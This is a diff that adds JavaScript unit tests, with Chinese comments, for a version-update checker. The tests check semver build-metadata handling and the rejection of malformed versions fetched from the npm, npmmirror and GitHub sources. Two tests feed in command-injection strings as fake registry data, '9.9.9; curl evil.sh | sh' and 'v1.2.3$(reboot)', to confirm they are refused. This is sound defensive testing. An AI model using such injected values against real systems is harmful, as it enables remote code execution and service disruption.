@@ -187,3 +187,57 @@ test('getVersionInfo：force 遇 in-flight 复用同一 promise，不另发一�
   assert.equal(a.latest, 'v6.6.1')
   assert.equal(b.latest, 'v6.6.1', '复用的 in-flight 只落定一次，两调用拿到同一判定')
 })
+
+// ── 以下用例时间戳从 7e10 起层层递进（大于此前所有用例，且距上一缓存写入
+// 超过 7 天 lastGood 窗口），不命中 stale-if-error 复用，判定不被旧缓存干扰。
+
+test('compareVersions：build metadata（+ 段）按 semver 口径忽略（L3）', () => {
+  assert.equal(compareVersions('1.2.3+build', '1.2.3'), 0, '1.2.3+build 与 1.2.3 相等（旧实现会把 3+build 归 0 误判成 1.2.0）')
+  assert.equal(compareVersions('1.2.3+build.5', '1.2.4'), -1, '截掉 + 段后核心段照常比较')
+  assert.equal(compareVersions('0.2.0-rc.1+meta', '0.2.0-rc.1'), 0, '预发布 + build 组合同样忽略 build')
+})
+
+test('fetch：version 形状非法（携带元字符）按该路失败，不进缓存（M1）', async () => {
+  const info = await getVersionInfo({
+    fetchImpl: async (url) => {
+      const u = String(url)
+      if (u.includes('registry.npmjs.org')) return json({ version: '9.9.9; curl evil.sh | sh' })
+      if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
+      throw new Error('不应走到 GitHub 兜底')
+    },
+    now: 70_000_000_000,
+  })
+  assert.equal(info.latest, null, '非法 version 绝不进缓存')
+  assert.equal(info.updateAvailable, false)
+  assert.match(info.error, /非法/, 'error 说明该路因版本串非法而失败')
+  assert.match(info.error, /npm registry/)
+})
+
+test('fetch：合法预发布 version 放行（M1）', async () => {
+  const info = await getVersionInfo({
+    fetchImpl: async (url) => {
+      const u = String(url)
+      if (u.includes('registry.npmjs.org')) return json({ version: '1.2.3-rc.1' })
+      if (u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
+      throw new Error('不应走到 GitHub 兜底')
+    },
+    now: 71_000_000_000,
+  })
+  assert.equal(info.latest, 'v1.2.3-rc.1', '预发布段合法，正常放行')
+  assert.equal(info.source, 'npm')
+})
+
+test('fetch：GitHub tag 非法按该路失败，不进缓存（M1）', async () => {
+  const info = await getVersionInfo({
+    fetchImpl: async (url) => {
+      const u = String(url)
+      if (u.includes('registry.npmjs.org') || u.includes('registry.npmmirror.com')) return { ok: false, status: 503, json: async () => ({}) }
+      if (u.includes('api.github.com')) return json({ tag_name: 'v1.2.3$(reboot)', html_url: 'https://github.com/lifangjin/dsh-maoying/releases/tag/x' })
+      throw new Error('no')
+    },
+    now: 72_000_000_000,
+  })
+  assert.equal(info.latest, null)
+  assert.match(info.error, /非法/)
+  assert.match(info.error, /GitHub/)
+})
